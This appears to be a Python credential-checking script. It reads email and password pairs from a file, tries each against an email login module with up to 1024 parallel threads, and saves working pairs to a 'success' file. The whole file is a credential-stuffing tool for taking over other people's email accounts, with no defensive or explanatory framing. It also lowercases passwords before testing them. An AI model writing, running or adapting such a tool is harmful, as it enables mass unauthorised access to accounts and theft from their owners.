#!/usr/bin/python3.3
import sys
import logging
import threading
import time

import email_login as el

writelock = threading.Lock()
maxThread = 1024  
emailLogin = el.EmailLogin()
sleeptime = 60


def printt():
    print(1111)

class scanner(threading.Thread):

    success = open("success", "a+")
    fail = open("fail", "a+")
    ignore = open("ignore", "a+")

    def __init__(self, email, password):
        super().__init__()
        self.email = email
        self.password = password

    def writeToFile(self, result):
        with writelock:
            f = getattr(self, result)
            f.write(self.email + ' ' + self.password + '\n')
            f.flush()

    def run(self):
        try:
            if emailLogin.login(self.email, self.password):
                print("Success")
                result = 'success'
            else:
                print("Fail")
                result = 'fail'
        except el.emailDomainNotFind as e:
            result = 'ignore'
            logging.error(e.msg)
        except el.emailFormatError:
            return

        self.writeToFile(result)

if __name__ == '__main__':
    filename = sys.argv[1]

    with open(filename, "r") as filehandle:
        while True:
            line = filehandle.readline()
    
            if not line:
                break

            content = line.split(' ')

            if len(content) == 2:
                email = content[0]
                password = content[1]

                while threading.active_count() > maxThread:
                    time.sleep(sleeptime/10)
                scanner(email.strip().lower(), password.strip().lower()).start()

#    time.sleep(sleeptime)

